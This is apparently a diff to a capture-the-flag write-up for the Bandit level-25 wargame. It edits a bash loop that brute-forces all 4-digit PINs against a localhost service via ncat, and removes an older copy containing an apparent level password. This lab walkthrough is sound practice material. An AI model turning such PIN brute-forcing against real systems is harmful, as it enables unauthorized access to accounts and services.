@@ -185,12 +185,11 @@ $ cd /tmp/BanditT25
 $ nano bandit25.sh
 
 #!/bin/bash
-# Use Bash to run this script.
 
 for char in {0..9}{0..9}{0..9}{0..9}; do
 # Try every possible 4-digit PIN: 0000 → 9999.
 
-    result=$(echo "TOKEN $char" | ncat localhost 30002 | egrep -vi "please|Wrong!|Try again| I am")
+    result=$(echo "TOKEN $char" | ncat localhost 30002 | grep -Evi "please|Wrong!|Try again| I am")
     # Send the PIN to the server and remove the normal "wrong" messages.
     # Save whatever is left in "result".
 
@@ -210,19 +209,8 @@ for char in {0..9}{0..9}{0..9}{0..9}; do
 done
 # Finish the loop.
 
+
 $ chmod +x bandit25.sh
+$ bash -n bandit25.sh # test script
 $ ./bandit25.sh
 
-#!/bin/bash
-
-for char in {0..9}{0..9}{0..9}{0..9}; do
-
-    result=$(echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $char" | ncat localhost 30002 | egrep -v "Exiting|Wrong|I am")
-
-    if [[ -n "$result" ]]; then
-        echo "Correct Pin: $char"
-        echo "$result"
-        break
-    fi
-
-done
